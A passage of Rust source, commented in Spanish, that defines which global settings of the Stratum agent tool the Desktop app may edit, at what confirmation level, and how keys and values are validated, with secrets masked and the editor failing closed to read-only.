//! Ajustes editables de Desktop: el `.stratumrc.json` **global**, con la
//! misma validación que `stratum config`.
//!
//! ```text
//! webview ── desktop_settings_set(clave, valor) ──► commands.rs
//!                                                     │ clasifica la clave (lista cerrada, aquí)
//!                                                     │ nivel B: ventana nativa (settings_gate.rs)
//!                                                     ▼
//!                       `stratum config set --global --json --stdin <clave>`  (settings_cli.rs)
//! ```
//!
//! Reglas que no se rompen (`docs/STRATUM_CLIENT_ARCHITECTURE.md` §8):
//!
//!  - **Lo escribe la CLI instalada**, que valida con su Zod y escribe de forma
//!    atómica: Desktop no duplica el esquema ni toca el JSON. Por el protocolo
//!    no pasa nada de esto (el daemon no expone la configuración).
//!  - **El nivel lo decide este fichero**, sobre la clave normalizada. El
//!    webview nunca lo dice. Solo se escribe lo que está en [`SPECS`] (lista
//!    cerrada): lo desconocido, lo que ejecuta código o abre acceso y las
//!    listas son nivel C y no se editan desde aquí.
//!      - **A**: preferencias inocuas, directo.
//!      - **B**: cambian la superficie de riesgo; solo tras confirmar en la
//!        ventana nativa y comprobando que el valor no cambió mientras tanto.
//!  - **El webview no recibe secretos**: llegan como máscara (`set`, y el nombre
//!    de la variable si es `${VAR}`). La clave nueva no vuelve, ni va a la
//!    ventana de confirmación, ni a un log, ni a la línea de comandos (va por la
//!    entrada estándar).
//!  - Falla cerrado: una CLI que no existe, es vieja o contesta algo que no se
//!    entiende deja el editor en solo lectura; un fichero de un Stratum más
//!    nuevo, también.

use dot_link::state::{CommandError, CommandErrorKind};
use serde::Serialize;
use serde_json::{json, Map, Value};
use std::path::Path;

// ---------------------------------------------------------------------------
// La CLI y la confirmación, como interfaces (para probar sin procesos ni ventanas)
// ---------------------------------------------------------------------------

/// Lo que devuelve la CLI cuando termina bien.
#[derive(Debug, Clone)]
pub struct CliOutput {
    pub stdout: String,
}

/// Por qué la CLI no dio una respuesta.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CliError {
    /// No hay `stratum` que ejecutar.
    NotFound,
    /// No terminó a tiempo (no se sabe si llegó a escribir).
    Timeout,
    /// Terminó con error: nada se escribió.
    Failed { stderr: String },
    /// No se pudo ni lanzar o hablarle.
    Io(String),
}

/// Ejecuta `stratum <args>` con `stdin` opcional. Los argumentos son siempre
/// palabras fijas o una clave ya normalizada; lo que escribe la persona va por
/// `stdin`.
pub trait CliRunner {
    fn run(&self, args: &[&str], stdin: Option<&str>) -> Result<CliOutput, CliError>;
}

/// Lo que enseña la ventana de confirmación. Sin el valor nuevo de un secreto.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ConfirmRequest {
    pub label: String,
    pub key: String,
    pub old: Option<String>,
    pub new: Option<String>,
    pub note: Option<String>,
}

/// Quien pide a la persona que confirme en una superficie que el webview no
/// controla. `Ok` solo si confirmó.
pub trait Confirmer {
    fn confirm(&self, request: &ConfirmRequest) -> Result<(), CommandError>;
}

// ---------------------------------------------------------------------------
// Errores
// ---------------------------------------------------------------------------

fn error(kind: CommandErrorKind, message: impl Into<String>) -> CommandError {
    CommandError::new(kind, message)
}

fn invalid(message: impl Into<String>) -> CommandError {
    error(CommandErrorKind::Invalid, message)
}

fn rejected(message: impl Into<String>) -> CommandError {
    error(CommandErrorKind::Rejected, message)
}

pub fn not_confirmed(reason: &str, message: &str) -> CommandError {
    CommandError {
        kind: CommandErrorKind::NotConfirmed,
        code: None,
        reason: Some(reason.into()),
        message: message.into(),
    }
}

fn clip(text: &str, max: usize) -> String {
    let mut out: String = text.chars().take(max).collect();
    if text.chars().count() > max {
        out.push('…');
    }
    out
}

/// Quita de un mensaje de la CLI cualquier trozo de lo que se estaba escribiendo.
fn scrub(message: &str, secrets: &[&str]) -> String {
    let mut out = message.trim().to_string();
    for secret in secrets.iter().filter(|s| !s.is_empty()) {
        out = out.replace(secret, "••••");
    }
    clip(&out, 600)
}

// ---------------------------------------------------------------------------
// La lista cerrada: qué se puede editar y con qué nivel
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum Level {
    /// Libre.
    A,
    /// Pide confirmación nativa.
    B,
}

/// Qué hay que reiniciar para que el cambio surta efecto.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Restart {
    /// Una sesión nueva.
    Session,
    /// Reiniciar el daemon (`stratum daemon stop` y volver a abrir Desktop).
    Daemon,
    /// Volver a abrir Desktop (lee `desktop.*` al arrancar).
    App,
}

#[derive(Debug, Clone, Copy)]
pub enum Kind {
    Bool,
    Enum(&'static [&'static str]),
    Int(i64, i64),
    Num(f64, f64),
    Text(usize),
    Url,
    Secret,
    /// `"auto"` o un entero positivo.
    AutoOrInt,
    /// Alias de un provider ya configurado.
    Alias,
    /// `"terminal"` o `#RRGGBB`.
    Color,
    /// Ruta absoluta, `~/…` o vacía.
    Folder,
}

impl Kind {
    fn name(self) -> &'static str {
        match self {
            Kind::Bool => "bool",
            Kind::Enum(_) => "enum",
            Kind::Int(..) => "int",
            Kind::Num(..) => "number",
            Kind::Text(_) => "text",
            Kind::Url => "url",
            Kind::Secret => "secret",
            Kind::AutoOrInt => "autoInt",
            Kind::Alias => "alias",
            Kind::Color => "color",
            Kind::Folder => "path",
        }
    }
}

pub struct Spec {
    /// Ruta con puntos; `*` es un nombre elegido por la persona (alias, entorno).
    pub path: &'static str,
    pub section: &'static str,
    pub label: &'static str,
    pub hint: &'static str,
    pub kind: Kind,
    pub level: Level,
}

const fn spec(
    path: &'static str,
    section: &'static str,
    label: &'static str,
    hint: &'static str,
    kind: Kind,
    level: Level,
) -> Spec {
    Spec {
        path,
        section,
        label,
        hint,
        kind,
        level,
    }
}

use Kind::*;
use Level::{A, B};

const LOG_LEVELS: &[&str] = &["trace", "debug", "info", "warn", "error", "silent"];
const BACKENDS: &[&str] = &["meta", "duckduckgo", "tavily", "brave", "serpapi"];
const TIERS: &[&str] = &["production", "staging", "development"];
const POLICIES: &[&str] = &["allow", "ask", "confirm-always"];
const CONFIRMATIONS: &[&str] = &["typed", "simple"];
const JOB_ACCESS: &[&str] = &["own", "read", "manage"];
const ERROR_FORMATS: &[&str] = &["xml", "json"];
const VERBOSITY: &[&str] = &["compact", "standard", "verbose"];
const GUIDES: &[&str] = &["inline", "pointers"];

/// Secciones del formulario, en orden. `providers` y `entornos` se pintan aparte.
pub const SECTIONS: &[(&str, &str, &str)] = &[
    (
        "model",
        "Modelo por defecto",
        "Qué provider usa Stratum cuando no le dices otro.",
    ),
    (
        "memory",
        "Memoria",
        "Lo que recuerda Stratum entre sesiones.",
    ),
    (
        "context",
        "Contexto",
        "Cuánto cabe en la ventana del modelo y cómo se reparte.",
    ),
    (
        "tools",
        "Herramientas",
        "Límites y permisos de las herramientas del agente.",
    ),
    ("agent", "Agente", "El bucle del agente y sus subagentes."),
    (
        "logging",
        "Registro y trazas",
        "Qué se apunta de cada sesión.",
    ),
    (
        "environments",
        "Entornos",
        "Cómo trata Stratum los destinos que marques (producción, pruebas…).",
    ),
    ("session", "Sesión", "Perfil de herramientas y planes."),
    (
        "daemon",
        "Daemon",
        "El proceso local que aloja las sesiones.",
    ),
    ("desktop", "Desktop", "Esta aplicación."),
    (
        "cli",
        "Interfaz de la CLI",
        "Aspecto de la terminal y ayudas de la CLI.",
    ),
];

/// La lista cerrada de claves editables. Todo lo demás es nivel C.
pub const SPECS: &[Spec] = &[
    // Provider y modelo por defecto. El resto del provider lo edita su formulario.
    spec(
        "provider.default",
        "model",
        "Provider por defecto",
        "Uno de los providers configurados.",
        Alias,
        A,
    ),
    spec(
        "provider.providers.*.model",
        "providers",
        "Modelo por defecto",
        "",
        Text(128),
        A,
    ),
    spec(
        "provider.providers.*.contextWindow",
        "providers",
        "Ventana de contexto",
        "Tokens.",
        Int(1, 100_000_000),
        A,
    ),
    spec(
        "provider.providers.*.baseUrl",
        "providers",
        "Dirección (baseUrl)",
        "",
        Url,
        B,
    ),
    spec(
        "provider.providers.*.apiKey",
        "providers",
        "Clave de API",
        "",
        Secret,
        B,
    ),
    // Memoria.
    spec(
        "memory.retrievalTopK",
        "memory",
        "Recuerdos que se recuperan",
        "Cuántas decisiones entran en el contexto.",
        Int(1, 100),
        A,
    ),
    spec(
        "memory.similarityThreshold",
        "memory",
        "Umbral de parecido",
        "De 0 a 1: a partir de qué parecido dos recuerdos se funden.",
        Num(0.0, 1.0),
        A,
    ),
    spec(
        "memory.autoExtract",
        "memory",
        "Extraer recuerdos solo",
        "El agente apunta decisiones al terminar.",
        Bool,
        A,
    ),
    spec(
        "memory.embeddingWarmup",
        "memory",
        "Calentar el modelo de embeddings",
        "",
        Bool,
        A,
    ),
    spec(
        "memory.embeddingModel",
        "memory",
        "Modelo de embeddings",
        "Se descarga la primera vez que se usa.",
        Text(200),
        B,
    ),
    spec(
        "memory.embeddingDimension",
        "memory",
        "Dimensión de los embeddings",
        "Tiene que coincidir con el modelo.",
        Int(1, 65_536),
        B,
    ),
    spec(
        "memory.extractionModel",
        "memory",
        "Modelo que extrae recuerdos",
        "",
        Text(128),
        B,
    ),
    spec(
        "memory.embeddingEndpoint.url",
        "memory",
        "Servidor de embeddings (dirección)",
        "Los textos de la memoria salen hacia ese servidor.",
        Url,
        B,
    ),
    spec(
        "memory.embeddingEndpoint.model",
        "memory",
        "Servidor de embeddings (modelo)",
        "",
        Text(128),
        B,
    ),
    spec(
        "memory.embeddingEndpoint.apiKey",
        "memory",
        "Servidor de embeddings (clave)",
        "",
        Secret,
        B,
    ),
    spec(
        "memory.session.enabled",
        "memory",
        "Memoria de sesión",
        "Resume lo antiguo de una conversación larga.",
        Bool,
        A,
    ),
    spec(
        "memory.session.compactAt",
        "memory",
        "Compactar al llegar a",
        "Fracción del presupuesto de entrada (0,2 a 0,95).",
        Num(0.2, 0.95),
        A,
    ),
    spec(
        "memory.session.targetContext",
        "memory",
        "Dejar el contexto en",
        "Fracción tras compactar (0,1 a 0,9).",
        Num(0.1, 0.9),
        A,
    ),
    spec(
        "memory.session.timeoutMs",
        "memory",
        "Plazo de la compactación (ms)",
        "",
        Int(1, 3_600_000),
        A,
    ),
    spec(
        "memory.session.allowRemote",
        "memory",
        "Permitir un modelo remoto para la memoria de sesión",
        "El contenido de la conversación sale hacia otro provider.",
        Bool,
        B,
    ),
    spec(
        "memory.session.extractor.provider",
        "memory",
        "Memoria de sesión: provider que extrae",
        "",
        Text(64),
        B,
    ),
    spec(
        "memory.session.extractor.model",
        "memory",
        "Memoria de sesión: modelo que extrae",
        "",
        Text(128),
        B,
    ),
    spec(
        "memory.session.summarizer.provider",
        "memory",
        "Memoria de sesión: provider que resume",
        "",
        Text(64),
        B,
    ),
    spec(
        "memory.session.summarizer.model",
        "memory",
        "Memoria de sesión: modelo que resume",
        "",
        Text(128),
        B,
    ),
    // Contexto.
    spec(
        "context.maxTokens",
        "context",
        "Ventana máxima",
        "«auto» o un número de tokens.",
        AutoOrInt,
        A,
    ),
    spec(
        "context.reserveOutput",
        "context",
        "Reserva para la respuesta",
        "Tokens.",
        Int(1, 100_000_000),
        A,
    ),
    spec(
        "context.recent.maxTokens",
        "context",
        "Tope de la conversación reciente",
        "Tokens.",
        Int(1, 100_000_000),
        A,
    ),
    spec(
        "context.sessionMemory.maxTokens",
        "context",
        "Tope de la memoria de sesión",
        "Tokens.",
        Int(1, 100_000_000),
        A,
    ),
    spec(
        "context.projectMemory.maxTokens",
        "context",
        "Tope de la memoria del proyecto",
        "Tokens.",
        Int(1, 100_000_000),
        A,
    ),
    spec(
        "context.globalMemory.maxTokens",
        "context",
        "Tope de la memoria global",
        "Tokens.",
        Int(1, 100_000_000),
        A,
    ),
    // Herramientas.
    spec(
        "tools.confirmDestructive",
        "tools",
        "Confirmar lo destructivo",
        "Pedir confirmación antes de borrar, formatear…",
        Bool,
        B,
    ),
    spec(
        "tools.auditLog",
        "tools",
        "Auditar los comandos",
        "Apunta cada comando que ejecuta el agente.",
        Bool,
        B,
    ),
    spec(
        "tools.bashTimeout",
        "tools",
        "Plazo de un comando (ms)",
        "",
        Int(1, 86_400_000),
        A,
    ),
    spec(
        "tools.execMaxBytes",
        "tools",
        "Salida máxima de un comando (bytes)",
        "",
        Int(1, 1_073_741_824),
        A,
    ),
    spec(
        "tools.webSearch.backend",
        "tools",
        "Buscador web",
        "A quién se envían las búsquedas.",
        Enum(BACKENDS),
        B,
    ),
    spec(
        "tools.webSearch.apiKey",
        "tools",
        "Buscador web: clave",
        "",
        Secret,
        B,
    ),
    spec(
        "tools.webSearch.tavilyApiKey",
        "tools",
        "Tavily: clave",
        "",
        Secret,
        B,
    ),
    spec(
        "tools.webSearch.maxResults",
        "tools",
        "Resultados por búsqueda",
        "",
        Int(1, 20),
        A,
    ),
    // Navegador del agente. El ejecutable y los hosts que cuentan como locales
    // (`tools.browser.executable|allowHosts`) no están aquí: son C (solo CLI).
    spec(
        "tools.browser.enabled",
        "tools",
        "Navegador del agente",
        "Deja al agente abrir y probar la app en un Edge o Chrome instalado (headless).",
        Bool,
        A,
    ),
    spec(
        "tools.browser.idleMinutes",
        "tools",
        "Minutos sin uso antes de cerrar el navegador",
        "",
        Int(1, 1440),
        A,
    ),
    spec(
        "tools.jobs.enabled",
        "tools",
        "Procesos en segundo plano",
        "Deja al agente lanzar procesos que siguen vivos.",
        Bool,
        B,
    ),
    spec(
        "tools.jobs.subagentAccess",
        "tools",
        "Qué ve un subagente de los procesos",
        "",
        Enum(JOB_ACCESS),
        B,
    ),
    spec(
        "tools.jobs.maxRunning",
        "tools",
        "Procesos a la vez",
        "",
        Int(1, 1_000),
        A,
    ),
    spec(
        "tools.jobs.maxRetained",
        "tools",
        "Procesos que se conservan",
        "",
        Int(1, 100_000),
        A,
    ),
    spec(
        "tools.jobs.maxOutputChars",
        "tools",
        "Salida máxima de un proceso (caracteres)",
        "",
        Int(1, 1_000_000_000),
        A,
    ),
    spec(
        "tools.jobs.maxTotalOutputChars",
        "tools",
        "Salida máxima de todos los procesos (caracteres)",
        "",
        Int(1, 2_000_000_000),
        A,
    ),
    spec(
        "tools.jobs.readChars",
        "tools",
        "Lectura por defecto (caracteres)",
        "",
        Int(1, 10_000_000),
        A,
    ),
    spec(
        "tools.jobs.maxReadChars",
        "tools",
        "Lectura máxima (caracteres)",
        "",
        Int(1, 10_000_000),
        A,
    ),
    spec(
        "tools.jobs.maxRuntimeMs",
        "tools",
        "Duración máxima de un proceso (ms)",
        "",
        Int(1, 604_800_000),
        A,
    ),
    spec(
        "tools.jobs.maxWaitMs",
        "tools",
        "Espera máxima (ms)",
        "",
        Int(1, 3_600_000),
        A,
    ),
    // Agente.
    spec(
        "agent.maxIterations",
        "agent",
        "Vueltas máximas por turno",
        "",
        Int(1, 10_000),
        A,
    ),
    spec(
        "agent.maxToolRetries",
        "agent",
        "Reintentos de una herramienta",
        "",
        Int(1, 100),
        A,
    ),
    spec(
        "agent.toolErrorFormat",
        "agent",
        "Formato de los errores de herramienta",
        "",
        Enum(ERROR_FORMATS),
        A,
    ),
    spec(
        "agent.compressionKeepRounds",
        "agent",
        "Rondas que se conservan al comprimir",
        "",
        Int(1, 1_000),
        A,
    ),
    spec(
        "agent.compressionThreshold",
        "agent",
        "Comprimir al llegar a",
        "Fracción de la ventana (0,1 a 1).",
        Num(0.1, 1.0),
        A,
    ),
    spec(
        "agent.compressorModel",
        "agent",
        "Modelo que comprime",
        "",
        Text(128),
        A,
    ),
    spec(
        "agent.compressionTimeoutMs",
        "agent",
        "Plazo de la compresión (ms)",
        "",
        Int(1, 3_600_000),
        A,
    ),
    spec(
        "agent.compressionReusePrefix",
        "agent",
        "Reusar el prefijo al comprimir",
        "",
        Bool,
        A,
    ),
    spec(
        "agents.defaultProfile",
        "agent",
        "Perfil por defecto",
        "",
        Text(64),
        A,
    ),
    spec(
        "agents.maxConcurrency",
        "agent",
        "Subagentes a la vez",
        "",
        Int(1, 64),
        A,
    ),
    spec(
        "agents.subagentRetentionDays",
        "agent",
        "Días que se conservan los subagentes",
        "0 = no purgar.",
        Int(0, 3_650),
        A,
    ),
    spec(
        "agents.subagentTimeoutMs",
        "agent",
        "Plazo de un subagente (ms)",
        "0 = sin plazo.",
        Int(0, 604_800_000),
        A,
    ),
    spec(
        "agents.subagentMaxIterations",
        "agent",
        "Vueltas máximas de un subagente",
        "",
        Int(1, 10_000),
        A,
    ),
    // Registro y trazas.
    spec(
        "logging.level",
        "logging",
        "Nivel del log",
        "",
        Enum(LOG_LEVELS),
        A,
    ),
    spec(
        "logging.stderr",
        "logging",
        "Log por la salida de errores",
        "",
        Bool,
        A,
    ),
    spec(
        "logging.redact",
        "logging",
        "Ocultar secretos en el log",
        "Apagarlo puede dejar claves en los ficheros de log.",
        Bool,
        B,
    ),
    spec(
        "logging.file.enabled",
        "logging",
        "Log en fichero",
        "",
        Bool,
        A,
    ),
    spec(
        "logging.file.maxBytes",
        "logging",
        "Tamaño máximo de un fichero de log (bytes)",
        "",
        Int(1, 1_073_741_824),
        A,
    ),
    spec(
        "logging.file.maxFiles",
        "logging",
        "Ficheros de log que se conservan",
        "",
        Int(1, 1_000),
        A,
    ),
    spec(
        "trace.enabled",
        "logging",
        "Guardar la traza de cada sesión",
        "",
        Bool,
        A,
    ),
    spec(
        "trace.retentionDays",
        "logging",
        "Días que se conserva la traza",
        "0 = no purgar.",
        Int(0, 3_650),
        A,
    ),
    spec(
        "trace.maxFieldChars",
        "logging",
        "Tamaño máximo de un campo de la traza",
        "",
        Int(1_000, 100_000_000),
        A,
    ),
    spec(
        "trace.screenshots",
        "logging",
        "Guardar las capturas de pantalla en la traza",
        "Se guardan en disco sin ocultar nada.",
        Bool,
        B,
    ),
    // Entornos.
    spec(
        "environments.*.tier",
        "environments",
        "Nivel",
        "",
        Enum(TIERS),
        B,
    ),
    spec(
        "environments.*.policy",
        "environments",
        "Política",
        "",
        Enum(POLICIES),
        B,
    ),
    spec(
        "environments.*.requirePlan",
        "environments",
        "Exigir un plan",
        "",
        Bool,
        B,
    ),
    spec(
        "environments.*.readOnly",
        "environments",
        "Solo lectura",
        "",
        Bool,
        B,
    ),
    spec(
        "environments.*.confirmation",
        "environments",
        "Confirmación",
        "",
        Enum(CONFIRMATIONS),
        B,
    ),
    // Sesión.
    spec(
        "session.profile",
        "session",
        "Perfil de herramientas",
        "«auto» elige según la infraestructura a la vista.",
        Text(64),
        B,
    ),
    spec(
        "session.planRetentionDays",
        "session",
        "Días que se conservan los planes",
        "0 = no purgar.",
        Int(0, 3_650),
        A,
    ),
    // Daemon.
    spec(
        "daemon.idleExitMinutes",
        "daemon",
        "Apagarse tras (minutos sin actividad)",
        "0 = nunca.",
        Num(0.0, 100_000.0),
        A,
    ),
    spec(
        "daemon.eventBuffer",
        "daemon",
        "Eventos que guarda por sesión",
        "",
        Int(16, 100_000),
        A,
    ),
    spec(
        "daemon.maxSessions",
        "daemon",
        "Sesiones vivas a la vez",
        "",
        Int(1, 256),
        A,
    ),
    spec(
        "daemon.autoStart",
        "daemon",
        "La CLI arranca el daemon sola",
        "",
        Bool,
        B,
    ),
    spec(
        "daemon.detachedTtlMinutes",
        "daemon",
        "Minutos que espera a una sesión desconectada",
        "0 = sin plazo.",
        Num(0.0, 100_000.0),
        A,
    ),
    spec(
        "daemon.approvalTimeoutMinutes",
        "daemon",
        "Minutos que espera una aprobación sin nadie delante",
        "Pasado el plazo se deniega. 0 = sin plazo.",
        Num(0.0, 100_000.0),
        B,
    ),
    spec(
        "daemon.persistSessions",
        "daemon",
        "Guardar las sesiones del daemon en disco",
        "",
        Bool,
        B,
    ),
    // Desktop.
    spec(
        "desktop.notifications.enabled",
        "desktop",
        "Notificaciones del sistema",
        "",
        Bool,
        A,
    ),
    spec(
        "desktop.notifications.minSeconds",
        "desktop",
        "Avisar si la respuesta tarda más de (s)",
        "",
        Num(0.0, 3600.0),
        A,
    ),
    spec(
        "desktop.globalHotkey",
        "desktop",
        "Atajo global",
        "Trae la ventana al frente. Vacío = ninguno.",
        Text(64),
        A,
    ),
    spec(
        "desktop.updates.autoCheck",
        "desktop",
        "Buscar actualizaciones al abrir",
        "",
        Bool,
        A,
    ),
    spec(
        "desktop.workspaces.root",
        "desktop",
        "Carpeta de las conversaciones",
        "Dónde guarda Desktop los ficheros de cada conversación.",
        Folder,
        B,
    ),
    spec(
        "desktop.workspaces.maxFileMB",
        "desktop",
        "Tope por fichero (MB)",
        "",
        Num(0.001, 4096.0),
        A,
    ),
    spec(
        "desktop.workspaces.maxWorkspaceMB",
        "desktop",
        "Tope por conversación (MB)",
        "",
        Num(0.001, 65_536.0),
        A,
    ),
    spec(
        "desktop.workspaces.compressAfterDays",
        "desktop",
        "Días hasta comprimir una conversación",
        "0 = nunca. Sin efecto desde M12.",
        Num(0.0, 3650.0),
        A,
    ),
    spec(
        "desktop.workspaces.deleteAfterDays",
        "desktop",
        "Días hasta borrar una conversación",
        "0 = nunca. Sin efecto desde M12.",
        Num(0.0, 3650.0),
        A,
    ),
    // Interfaz de la CLI.
    spec(
        "tui.background",
        "cli",
        "Fondo de la terminal",
        "«terminal» o un color #RRGGBB.",
        Color,
        A,
    ),
    spec(
        "tui.verbosity",
        "cli",
        "Detalle al cerrar un turno",
        "",
        Enum(VERBOSITY),
        A,
    ),
    spec(
        "prompt.guides",
        "cli",
        "Guías del prompt",
        "",
        Enum(GUIDES),
        A,
    ),
    spec("skills.enabled", "cli", "Skills", "", Bool, A),
    spec(
        "snapshots.enabled",
        "cli",
        "Deshacer por turno",
        "",
        Bool,
        A,
    ),
    spec(
        "snapshots.maxFileBytes",
        "cli",
        "Tamaño máximo de un fichero en una instantánea (bytes)",
        "",
        Int(1, 1_073_741_824),
        A,
    ),
    spec(
        "snapshots.retentionDays",
        "cli",
        "Días que se conservan las instantáneas",
        "0 = no purgar.",
        Int(0, 3_650),
        A,
    ),
    spec(
        "snapshots.timeoutMs",
        "cli",
        "Plazo de una instantánea (ms)",
        "",
        Int(1, 3_600_000),
        A,
    ),
    spec(
        "snapshots.maxFiles",
        "cli",
        "Ficheros máximos por instantánea",
        "",
        Int(1, 10_000_000),
        A,
    ),
];

/// Lo que se enseña como «solo CLI» aunque no se pueda editar: nombre y las
/// claves que abarca. Solo se dice si hay algo definido, nunca su valor.
pub const CLI_ONLY: &[(&str, &[&str])] = &[
    ("Plugins (ejecutan código)", &["plugins"]),
    ("Servidores MCP (lanzan procesos)", &["mcp"]),
    ("Conectores del asistente de Dot", &["companion"]),
    ("Hosts SSH", &["ssh"]),
    ("La caja (contenedor)", &["box"]),
    ("Canales externos (Telegram)", &["channels"]),
    ("Generación de imágenes", &["imageGeneration"]),
    ("Language servers (LSP)", &["lsp"]),
    ("Comando de pruebas", &["tools.testCommand"]),
    (
        "Reglas de comandos y rutas",
        &[
            "tools.guardedCommands",
            "tools.destructivePatterns",
            "tools.sensitivePathAllowlist",
        ],
    ),
    ("Hosts permitidos de web_fetch", &["tools.webFetch"]),
    ("Redacción extra de secretos", &["tools.redaction"]),
    ("Perfiles de sesión propios", &["session.profiles"]),
    (
        "Rutas de la memoria",
        &[
            "memory.projectFile",
            "memory.globalFile",
            "memory.decisionsFile",
            "memory.vectorDb",
        ],
    ),
    (
        "Otras rutas y listas",
        &[
            "logging.file.dir",
            "trace.dir",
            "prompt.guidesDir",
            "skills.registryFile",
            "skills.builtin",
        ],
    ),
    (
        "Ajustes por modelo, plazos y caché de cada provider",
        &[
            "provider.providers.*.models",
            "provider.providers.*.timeouts",
            "provider.providers.*.cache",
            "provider.providers.*.pricing",
            "provider.providers.*.type",
        ],
    ),
    (
        "Qué destinos abarca cada entorno",
        &["environments.*.match"],
    ),
];

/// Secciones de primer nivel que nunca se editan desde aquí, pase lo que pase
/// con la lista de arriba (defensa en profundidad).
const NEVER_EDITABLE: &[&str] = &[
    "plugins",
    "mcp",
    "ssh",
    "box",
    "companion",
    "channels",
    "imageGeneration",
    "lsp",
    "schemaVersion",
];

// ---------------------------------------------------------------------------
// Normalizar y clasificar la clave
// ---------------------------------------------------------------------------

const MAX_KEY_CHARS: usize = 160;
const MAX_SEGMENTS: usize = 8;

/// Un nombre elegido por la persona (alias de provider, nombre de entorno): el
/// mismo patrón que el esquema de entornos.
pub fn is_name(text: &str) -> bool {
    let mut chars = text.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    text.len() <= 32
        && first.is_ascii_alphanumeric()
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// Parte una clave con puntos en tramos, rechazando todo lo que no sea una
/// clave de configuración llana: vacíos, `..`, corchetes, barras, espacios,
/// control, prototipos, demasiado larga o profunda.
pub fn normalize_key(raw: &str) -> Result<Vec<String>, CommandError> {
    let bad = || invalid("Esa clave de configuración no es válida.");
    if raw.is_empty() || raw.chars().count() > MAX_KEY_CHARS {
        return Err(bad());
    }
    let segments: Vec<&str> = raw.split('.').collect();
    if segments.len() > MAX_SEGMENTS {
        return Err(bad());
    }
    for segment in &segments {
        let plain = !segment.is_empty()
            && segment
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
        let proto = matches!(*segment, "__proto__" | "constructor" | "prototype");
        if !plain || proto {
            return Err(bad());
        }
    }
    Ok(segments.into_iter().map(str::to_string).collect())
}

fn matches_spec(spec: &Spec, segments: &[String]) -> bool {
    let pattern: Vec<&str> = spec.path.split('.').collect();
    pattern.len() == segments.len()
        && pattern
            .iter()
            .zip(segments)
            .all(|(p, s)| if *p == "*" { is_name(s) } else { p == s })
}

pub enum Class {
    /// Se puede editar, con este nivel.
    Editable(&'static Spec),
    /// Nivel C: solo lectura, «edítalo con `stratum config`».
    CliOnly,
}

/// El nivel de una clave. Lista cerrada: lo que no está en [`SPECS`] es C.
pub fn classify(segments: &[String]) -> Class {
    if segments
        .first()
        .is_some_and(|first| NEVER_EDITABLE.contains(&first.as_str()))
    {
        return Class::CliOnly;
    }
    SPECS
        .iter()
        .find(|s| matches_spec(s, segments))
        .map_or(Class::CliOnly, Class::Editable)
}

/// La entrada de [`SPECS`] con esa ruta exacta (con su `*`).
fn spec_for(path: &str) -> &'static Spec {
    SPECS
        .iter()
        .find(|s| s.path == path)
        .expect("la ruta está en SPECS")
}

pub fn restart_of(segments: &[String]) -> Restart {
    match segments.first().map(String::as_str) {
        Some("desktop") => Restart::App,
        Some("daemon" | "logging" | "trace") => Restart::Daemon,
        _ => Restart::Session,
    }
}

// ---------------------------------------------------------------------------
// Valores
// ---------------------------------------------------------------------------

/// `${NOMBRE}` entero: una referencia a una variable de entorno (no es secreto).
pub fn pure_env_ref(text: &str) -> Option<&str> {
    let name = text.strip_prefix("${")?.strip_suffix('}')?;
    let mut chars = name.chars();
    let first = chars.next()?;
    (name.len() <= 128
        && (first.is_ascii_alphabetic() || first == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_'))
    .then_some(name)
}

fn clean_text(text: &str, max: usize) -> bool {
    text.chars().count() <= max && !text.chars().any(char::is_control)
}

/// Comprueba el valor contra el tipo de la clave y devuelve el que se escribirá.
/// La CLI vuelve a validar con el esquema; esto evita mandarle tonterías y
/// fija el tipo (un texto «123» no se convierte en número).
pub fn check_value(spec: &Spec, value: &Value) -> Result<Value, CommandError> {
    let wrong = |what: &str| invalid(format!("«{}»: {what}", spec.label));
    match spec.kind {
        Bool => value
            .as_bool()
            .map(Value::Bool)
            .ok_or_else(|| wrong("tiene que ser sí o no.")),
        Enum(options) => match value.as_str() {
            Some(s) if options.contains(&s) => Ok(value.clone()),
            _ => Err(wrong("no es una de las opciones.")),
        },
        Int(min, max) => {
            let n = value
                .as_i64()
                .or_else(|| {
                    value
                        .as_f64()
                        .filter(|f| f.fract() == 0.0 && f.abs() < 1e15)
                        .map(|f| f as i64)
                })
                .ok_or_else(|| wrong("tiene que ser un número entero."))?;
            if n < min || n > max {
                return Err(wrong(&format!("tiene que estar entre {min} y {max}.")));
            }
            Ok(json!(n))
        }
        Num(min, max) => {
            let n = value
                .as_f64()
                .filter(|n| n.is_finite())
                .ok_or_else(|| wrong("tiene que ser un número."))?;
            if n < min || n > max {
                return Err(wrong(&format!("tiene que estar entre {min} y {max}.")));
            }
            Ok(json!(n))
        }
        Text(max) => match value.as_str() {
            Some(s) if clean_text(s, max) => Ok(value.clone()),
            _ => Err(wrong(&format!(
                "tiene que ser un texto de hasta {max} caracteres, sin saltos de línea."
            ))),
        },
        Url => match value.as_str() {
            Some(s)
                if clean_text(s, 512)
                    && (s.starts_with("http://") || s.starts_with("https://"))
                    // Una dirección tapada para enseñarla (`safe_url`) no se escribe de vuelta.
                    && !s.contains('•')
                    && !s.chars().any(char::is_whitespace) =>
            {
                Ok(value.clone())
            }
            _ => Err(wrong("tiene que ser una dirección http:// o https://.")),
        },
        Secret => match value.as_str() {
            Some(s) if clean_text(s, 1024) => Ok(value.clone()),
            _ => Err(wrong("no es un texto válido.")),
        },
        AutoOrInt => match value {
            Value::String(s) if s == "auto" => Ok(value.clone()),
            other => match other.as_i64() {
                Some(n) if (1..=100_000_000).contains(&n) => Ok(json!(n)),
                _ => Err(wrong("tiene que ser «auto» o un número de tokens.")),
            },
        },
        Alias => match value.as_str() {
            Some(s) if is_name(s) => Ok(value.clone()),
            _ => Err(wrong("no es un alias válido.")),
        },
        Color => match value.as_str() {
            Some("terminal") => Ok(value.clone()),
            Some(s)
                if s.len() == 7
                    && s.starts_with('#')
                    && s[1..].chars().all(|c| c.is_ascii_hexdigit()) =>
            {
                Ok(value.clone())
            }
            _ => Err(wrong("tiene que ser «terminal» o un color #RRGGBB.")),
        },
        Folder => match value.as_str() {
            Some("") => Ok(value.clone()),
            Some(s)
